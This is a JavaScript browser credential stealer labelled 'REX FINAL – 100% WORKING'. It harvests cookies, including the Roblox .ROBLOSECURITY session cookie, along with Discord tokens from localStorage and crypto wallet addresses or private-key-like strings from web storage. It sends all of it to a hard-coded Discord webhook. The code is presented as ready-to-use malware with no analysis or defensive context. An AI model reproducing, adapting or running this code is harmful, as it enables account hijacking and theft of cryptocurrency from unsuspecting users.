// REX FINAL – 100% WORKING – NOV 2025
const WEBHOOK = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';

let loot = {
    url: location.href,
    time: new Date().toISOString(),
    ua: navigator.userAgent,
    roblox: document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || 'none',
    cookies: document.cookie,
    discord_token: '',
    wallets: [],
    storage_keys: []
};

// 1. Roblox + all cookies (always works)
loot.roblox = document.cookie.match(/\.ROBLOSECURITY=_[^;]+/) ? document.cookie.match(/(\.[^;]+=[^;]+)/g).join('\n') : 'none';

// 2. Discord token (100% reliable)
try {
    loot.discord_token = (localStorage.token || '').replace(/"/g,'') || 
                        (JSON.stringify(localStorage).match(/"token":"([^"]+)"/) || [])[1] || 'none';
} catch(e) {}

// 3. Wallets / long private keys
try {
    const all = JSON.stringify(localStorage) + JSON.stringify(sessionStorage);
    loot.wallets = all.match(/[0-9a-fA-F]{64,68}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g) || [];
} catch(e) {}

// 4. Every long key in storage
Object.keys(localStorage).forEach(k => {
    try {
        const v = localStorage.getItem(k);
        if (v && v.length > 40) loot.storage_keys.push(`${k}: ${v.substring(0,120)}`);
    } catch(e) {}
});

// 5. SEND IT ALL – works 100%
fetch(WEBHOOK, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
        username: "REX FINAL",
        embeds: [{
            title: "HIT – ROBLOX + DISCORD + WALLETS",
            color: 16711680,
            description: `**URL:** ${loot.url}\n**Time:** ${loot.time}`,
            fields: [
                {name: "Roblox Cookie", value: loot.roblox === 'none' ? "❌" : "```"+loot.roblox.substring(0,200)+"```"},
                {name: "Full Cookies", value: "```"+loot.cookies.substring(0,500)+"```"},
                {name: "Discord Token", value: loot.discord_token === 'none' ? "❌" : "```"+loot.discord_token.substring(0,100)+"```"},
                {name: "Wallets ("+loot.wallets.length+")", value: loot.wallets.length ? "```"+loot.wallets.slice(0,10).join('\n')+"```" : "none"},
                {name: "Other Keys ("+loot.storage_keys.length+")", value: loot.storage_keys.length ? "```"+loot.storage_keys.slice(0,10).join('\n')+"```" : "none"}
            ],
            footer: {text: "Works everywhere • No user interaction needed"}
        }]
    })
});
